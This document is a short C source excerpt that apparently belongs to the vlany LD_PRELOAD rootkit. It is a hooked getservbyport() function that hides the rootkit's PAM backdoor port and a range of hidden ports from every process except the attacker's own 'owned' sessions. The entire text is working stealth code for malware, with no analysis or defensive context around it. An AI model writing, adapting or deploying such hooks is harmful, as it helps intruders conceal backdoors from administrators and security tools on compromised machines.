struct servent *getservbyport(int port, const char *proto)
{
    #ifdef DEBUG
        printf("[vlany] getservbyport() called\n");
    #endif

    HOOK(old_getservbyport, CGETSERVBYPORT);

    if(!port || owned()) return old_getservbyport(port, proto);

    struct servent *tmp = old_getservbyport(port, proto);
    if(tmp && (ntohs(tmp->s_port) == PAM_PORT || (ntohs(tmp->s_port) < HIGH_PORT && ntohs(tmp->s_port) > LOW_PORT))) return NULL;

    return tmp;
}
